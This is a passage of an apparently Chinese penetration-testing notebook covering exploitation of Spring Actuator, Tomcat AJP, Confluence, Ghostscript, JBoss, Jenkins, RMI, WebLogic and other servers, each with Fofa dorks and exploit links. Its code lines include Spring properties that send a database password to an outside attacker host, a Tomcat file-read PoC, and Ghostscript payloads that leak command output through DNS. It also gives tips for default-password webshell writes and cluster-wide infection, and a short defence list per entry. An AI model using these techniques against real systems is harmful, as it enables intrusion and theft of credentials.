<span class="hljs-string">/beans</span>
<span class="hljs-string">/jolokia</span>
<span class="hljs-string">/cloudfoundryapplication</span>
<span class="hljs-string">/hystrix.stream</span>
<span class="hljs-string">/actuator</span>
<span class="hljs-string">/actuator/auditevents</span>
<span class="hljs-string">/actuator/beans</span>
<span class="hljs-string">/actuator/health</span>
<span class="hljs-string">/actuator/conditions</span>
<span class="hljs-string">/actuator/configprops</span>
<span class="hljs-string">/actuator/env</span>
<span class="hljs-string">/actuator/info</span>
<span class="hljs-string">/actuator/loggers</span>
<span class="hljs-string">/actuator/heapdump</span>
<span class="hljs-string">/actuator/threaddump</span>
<span class="hljs-string">/actuator/metrics</span>
<span class="hljs-string">/actuator/scheduledtasks</span>
<span class="hljs-string">/actuator/httptrace</span>
<span class="hljs-string">/actuator/mappings</span>
<span class="hljs-string">/actuator/jolokia</span>
<span class="hljs-string">/actuator/hystrix.stream</span>
<span class="hljs-string">/monitor</span>
<span class="hljs-string">/monitor/auditevents</span>
<span class="hljs-string">/monitor/beans</span>
<span class="hljs-string">/monitor/health</span>
<span class="hljs-string">/monitor/conditions</span>
<span class="hljs-string">/monitor/configprops</span>
<span class="hljs-string">/monitor/env</span>
<span class="hljs-string">/monitor/info</span>
<span class="hljs-string">/monitor/loggers</span>
<span class="hljs-string">/monitor/heapdump</span>
<span class="hljs-string">/monitor/threaddump</span>
<span class="hljs-string">/monitor/metrics</span>
<span class="hljs-string">/monitor/scheduledtasks</span>
<span class="hljs-string">/monitor/httptrace</span>
<span class="hljs-string">/monitor/mappings</span>
<span class="hljs-string">/monitor/jolokia</span>
<span class="hljs-string">/monitor/hystrix.stream</span></code></pre>

<p>这里通过 <code>/env</code> + <code>/refresh</code> 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作</p>
<p>里面就有操作空间, 很像fastjson反序列化</p>
<p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok</p>
<pre><code class="hljs roboconf">eureka.client.serviceUrl.defaultZone=http://${<span class="hljs-attribute">somedb.password}@127.0.0.1</span>:5000
spring<span class="hljs-variable">.cloud</span><span class="hljs-variable">.bootstrap</span><span class="hljs-variable">.location</span>=http://${somedb<span class="hljs-variable">.password</span>}@artsploit<span class="hljs-variable">.com</span>/yaml-payload<span class="hljs-variable">.yml</span></code></pre>

<p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群</p>
<p>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时更新补丁</p>
<p>2.开启Spring Boot Actuators权限校验</p>
<p>3.前置WAF进行防护</p>
<h2 id="Phpstudy-后门远程代码执行"><a href="#Phpstudy-后门远程代码执行" class="headerlink" title="Phpstudy 后门远程代码执行"></a>Phpstudy 后门远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>Phpstudy 是一个国产的php快速集成环境, 主要用于学习测试, 但是也有很多人直接拿来部署服务器</p>
<p><strong>2. 影响组件</strong></p>
<p>Phpstudy</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs nginx"><span class="hljs-attribute">phpStudy</span> 探针</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"phpStudy 探针"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/" target="_blank" rel="noopener">https://paper.seebug.org/1044/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.phpstudy 根目录下面有个<code>l.php</code> , 里面有探针, 可以作为判断条件</p>
<p>2.还有个<code>/phpmyadmin</code>目录, 一般密码都是<code>root/root</code> 后台<code>mysql outfile</code> 写 shell 就ok了</p>
<p><strong>8. 防护方法</strong></p>
<p>1.及时删除phpstudy</p>
<p>2.升级到最新版</p>
<p>3.不要用phpstduy搭建生产环境</p>
<h2 id="Struts-系列漏洞"><a href="#Struts-系列漏洞" class="headerlink" title="Struts 系列漏洞"></a>Struts 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p>
<p><strong>2. 影响组件</strong><br>Struts</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs asciidoc">Struts
<span class="hljs-title">.action</span>
<span class="hljs-title">.do</span>
<span class="hljs-title">.action!xxxx</span></code></pre>

<p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/" target="_blank" rel="noopener">https://github.com/coffeehb/struts2_check/</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app="Struts2"</code> (这个不太准)</p>
<p><strong>5. 漏洞分析</strong></p>
<p>Struts2代码执行漏洞整理 – 简书<br><a href="https://www.jianshu.com/p/d7cd8a2a992b" target="_blank" rel="noopener">https://www.jianshu.com/p/d7cd8a2a992b</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan</p>
<p><a href="https://github.com/Lucifer1993/struts-scan/" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.不建议使用Struts</p>
<h2 id="Solr-系列漏洞"><a href="#Solr-系列漏洞" class="headerlink" title="Solr 系列漏洞"></a>Solr 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Solr 是企业常见的全文搜索服务, 这两年也爆出很多安全漏洞,</p>
<p><strong>2. 影响组件</strong></p>
<p>Solr</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Solr</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Solr"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a></p>
<p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<br><a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection</a></p>
<p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12409</a></p>
<p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet" target="_blank" rel="noopener">https://github.com/mogwailabs/mjet</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p>
<p>2.遇到<code>mjet</code>连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用<code>socat</code>进行流量转发, 后记里面有具体操作</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.不要对外开放敏感端口</p>
<h2 id="Tomcat-本地文件包含漏洞-CVE-2020-1938"><a href="#Tomcat-本地文件包含漏洞-CVE-2020-1938" class="headerlink" title="Tomcat 本地文件包含漏洞 (CVE-2020-1938)"></a>Tomcat 本地文件包含漏洞 (CVE-2020-1938)</h2><p><strong>1. 漏洞简介</strong></p>
<p>Tomcat 是常见的Web 容器, 用户量非常巨大, Tomcat 8009 ajp端口一直是默认开放的, 这个漏洞存在很多年了, 这次应该有奇效</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Tomcat 6</p>
<p>Apache Tomcat 7 &lt; 7.0.100</p>
<p>Apache Tomcat 8 &lt; 8.5.51</p>
<p>Apache Tomcat 9 &lt; 9.0.31</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs taggerscript">tomcat
8009
ajp
<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>15</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>=<span class="hljs-string">"ajp"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp协议文件包含漏洞分析/" target="_blank" rel="noopener">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p>
<p>主要代码也就这</p>
<pre><code class="hljs stylus">t = Tomcat(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">8009</span>)
_, data = t.perform_request(<span class="hljs-string">'/'</span>, attributes=[
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.request_uri'</span>, <span class="hljs-string">'/'</span>]}, 
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.path_info'</span>, <span class="hljs-string">"/WEB-INF/web.xml"</span>]}, 
    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.servlet_path'</span>, <span class="hljs-string">'/'</span>]}, 
])
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'----------------------------'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">""</span>.join([bytes.decode(d.data)</span></span> <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))</code></pre>

<p>2.通过修改这里的路径可以进行Webapp切换, 默认是<code>ROOT/</code>, 需要切换应用就改成 <code>/admin/</code> 之类的</p>
<p>3.通常检测的时候, 尽量保持<code>t.perform_request('/'</code> , 有的poc喜欢用 <code>/addsd</code> 这种的不存在的路径, 有些情况会读不到文件</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.屏蔽8009端口对外开放</p>
<h2 id="PHP-FPM-远程代码执行漏洞"><a href="#PHP-FPM-远程代码执行漏洞" class="headerlink" title="PHP-FPM 远程代码执行漏洞"></a>PHP-FPM 远程代码执行漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>国外安全研究员 Andrew Danau在解决一道 CTF 题目时发现, 向目标服务器 URL 发送 %0a 符号时, 服务返回异常, 疑似存在漏洞</p>
<p>2019年10月23日, github公开漏洞相关的详情以及exp.当nginx配置不当时, 会导致php-fpm远程任意代码执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Nginx + FPM + PHP7</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Nginx</span>
<span class="hljs-attribute">PHP</span>
<span class="hljs-attribute">nextcloud</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析<br><a href="https://paper.seebug.org/1063/" target="_blank" rel="noopener">https://paper.seebug.org/1063/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p>
<p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-11043</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502</p>
<p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p>
<p>2.Nextcloud 这个应用的默认配置就存在漏洞</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版php</p>
<p>2.修改nginx配置</p>
<h2 id="CVE-2019-3396-Confluence-Wiki-远程代码执行"><a href="#CVE-2019-3396-Confluence-Wiki-远程代码执行" class="headerlink" title="CVE-2019-3396 Confluence Wiki 远程代码执行"></a>CVE-2019-3396 Confluence Wiki 远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>Confluence Wiki 是企业常用的 Wiki 平台, 其媒体插件存在一处远程代码执行</p>
<p><strong>2. 影响组件</strong></p>
<p>Confluence</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>Confluence</p>
<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Confluence"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析<br><a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">https://paper.seebug.org/884/</a></p>
<p>Atlassian Confluence 远程代码执行漏洞分析 – 斗象能力中心</p>
<blockquote>
<p><a href="https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/" target="_blank" rel="noopener">Atlassian Confluence 远程代码执行漏洞分析</a></p>
</blockquote>
<p><strong>6. 漏洞利用</strong></p>
<p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-3396</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.本地写日志的方式getshell</p>
<p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p>
<p>这里的远程模板加载不支持http协议, 主要是<code>classloader</code>的问题, 不然应该更早挖出来, 这里还有一种本地写日志的方式getshell</p>
<p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持<code>file协议</code>可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p>
<p><code>velocity</code>比<code>php</code>语法要相对严格一点, 可能会报错, 而且<code>velocity</code>渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p>
<p>POC写入日志,分析一下挺简单的</p>
<pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/synchrony/heartbeat</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: localhost:8091</code></pre>

<p>这里就使用file协议包含log文件就ok</p>
<pre><code class="hljs crystal">POST /rest/tinymce/<span class="hljs-number">1</span>/<span class="hljs-function"><span class="hljs-keyword">macro</span><span class="hljs-title">/</span></span>preview HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-symbol">Host:</span> <span class="hljs-symbol">localhost:</span><span class="hljs-number">8090</span></code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="Ghostscript-上传图片代码执行"><a href="#Ghostscript-上传图片代码执行" class="headerlink" title="Ghostscript 上传图片代码执行"></a>Ghostscript 上传图片代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>Ghostscript 是图像处理中十分常用的库, 集成在imagemagick等多个开源组件中, 其 .ps文件存在沙箱绕过导致代码执行的问题影响广泛, 由于上传图片就有可能代码执行, 很多大厂中招</p>
<p><strong>2. 影响组件</strong></p>
<p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs asciidoc"><span class="hljs-title">.ps/.jpg/.png</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/157513" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157513</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Exploit Database Search<br><a href="https://www.exploit-db.com/search?q=Ghostscript" target="_blank" rel="noopener">https://www.exploit-db.com/search?q=Ghostscript</a></p>
<p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p>
<p>dnslog 可以用 <code>ping</code>uname<code>.admin.ceye.io</code> 或 <code>ping</code>whoami<code>.admin.ceye.io</code></p>
<p>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造</p>
<pre><code class="hljs autohotkey">ping `whoami`.centos.admin.ceye.io` / `ping `whoami`.ubuntu.admin.ceye.io</code></pre>

<p>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级到最新版</p>
<h2 id="Jboss-相关漏洞"><a href="#Jboss-相关漏洞" class="headerlink" title="Jboss 相关漏洞"></a>Jboss 相关漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>JBoss是一个基于J2EE的开放源代码应用服务器, 用户数量较大, 一些版本受到反序列化等漏洞影响</p>
<p><strong>2. 影响组件</strong></p>
<p>Jboss</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Jboss</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"JBoss"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a></p>
<p>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss" target="_blank" rel="noopener">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Jboss的漏洞在内网还是相对比较常见的, 试过几次<code>jexboss</code>, 效果还ok</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="Websphere-反序列化远程代码执行"><a href="#Websphere-反序列化远程代码执行" class="headerlink" title="Websphere 反序列化远程代码执行"></a>Websphere 反序列化远程代码执行</h2><p><strong>1. 漏洞简介</strong></p>
<p>Websphere 也是常见的java服务器, CVE-2015-7450(由于Comments Collections反序列化引起的, 应该是反序列化第一次被公众关注), 去年暴露了一个CVE-2019-4279(),</p>
<p>近期暴露了一个新的远程代码执行(CVE-2020-4276, CVE-2020-4362)</p>
<p><strong>2. 影响组件</strong></p>
<p>WebSphere</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs angelscript">WebSphere
<span class="hljs-number">8880</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"IBM-WebSphere"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p>
<p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py" target="_blank" rel="noopener">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p>
<p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的</p>
<p>Tomcat、Weblogic、JBoss、GlassFish、Resin、Websphere弱口令及拿webshell方法总结 – 先知社区<br><a href="https://xz.aliyun.com/t/309" target="_blank" rel="noopener">https://xz.aliyun.com/t/309</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="Jenkins-系列漏洞"><a href="#Jenkins-系列漏洞" class="headerlink" title="Jenkins 系列漏洞"></a>Jenkins 系列漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Jenkins 是常见的CI/CD服务器, 最常见的就是爆破弱口令然后使用groovy执行命令</p>
<p><strong>2. 影响组件</strong></p>
<p>Jenkins</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">Jenkins</span></code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Jenkins"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>Jenkins RCE漏洞分析汇总<br><a href="http://www.lmxspace.com/2019/09/15/Jenkins-RCE漏洞分析汇总/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ" target="_blank" rel="noopener">http://www.lmxspace.com/2019/09/15/Jenkins-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/?utm_source=tuicool&amp;utm_medium=referral#￦ﾀﾻ￧ﾻﾓ</a></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a></p>
<p>gquere/pwn_jenkins: Notes about attacking Jenkins servers</p>
<p><a href="https://github.com/gquere/pwn_jenkins" target="_blank" rel="noopener">https://github.com/gquere/pwn_jenkins</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p>
<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<p>4.升级到最新版</p>
<h2 id="RMI-对外开放"><a href="#RMI-对外开放" class="headerlink" title="RMI 对外开放"></a>RMI 对外开放</h2><p><strong>1. 漏洞简介</strong></p>
<p>Java RMI, 即 远程方法调用(Remote Method Invocation), 一种用于实现远程过程调用(RPC)(Remote procedure call)的Java API, 能直接传输序列化后的Java对象和分布式垃圾收集</p>
<p>通常开放在1090 1099等端口, 由于直接传输java对象, 随意存在远程代码执行.</p>
<p><strong>2. 影响组件</strong></p>
<p>java*</p>
<p><strong>3. 漏洞指纹</strong></p>
<pre><code class="hljs angelscript"><span class="hljs-number">1098</span>, <span class="hljs-number">1099</span>, <span class="hljs-number">1090</span>, <span class="hljs-number">8901</span>, <span class="hljs-number">8902</span>, <span class="hljs-number">8903</span>
N\x00
rmiregistry</code></pre>

<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"java-rmi"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>RMI-反序列化 – 先知社区<br><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
<p>Java RMI服务远程命令执行利用_91Ri.org<br><a href="http://www.91ri.org/15276.html" target="_blank" rel="noopener">http://www.91ri.org/15276.html</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.rmi一般在内网开放的比较多, nmap 扫描如下</p>
<pre><code class="hljs angelscript">nmap -v <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span> -p1099 -sV --script=rmi*</code></pre>

<p><strong>8. 防护方法</strong></p>
<p>1.设置强口令</p>
<p>2.尽量不要开放到公网</p>
<p>3.限制来源IP</p>
<h2 id="Weblogic-T3-协议漏洞"><a href="#Weblogic-T3-协议漏洞" class="headerlink" title="Weblogic T3 协议漏洞"></a>Weblogic T3 协议漏洞</h2><p><strong>1. 漏洞简介</strong></p>
<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击.</p>
<p><strong>2. 影响组件</strong></p>
<p>Weblogic</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>Lcom.tangosol.util.extractor.ReflectionExtractor</p>
<p>…</p>
<p><strong>4. Fofa Dork</strong></p>
<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>==<span class="hljs-string">"weblogic"</span></code></pre>

<p><strong>5. 漏洞分析</strong></p>
<p>相关漏洞有:</p>
<p>CVE-2017-3248<br><a href="https://paper.seebug.org/333/" target="_blank" rel="noopener">https://paper.seebug.org/333/</a></p>
<p>CVE-2018-2628<br>[<a href="http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2018/04/18/CVE-2018-2628%20%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2018/04/18/CVE-2018-2628" target="_blank" rel="noopener">http://xxlegend.com/2018/04/18/CVE-2018-2628</a> 简单复现和分析/)</p>
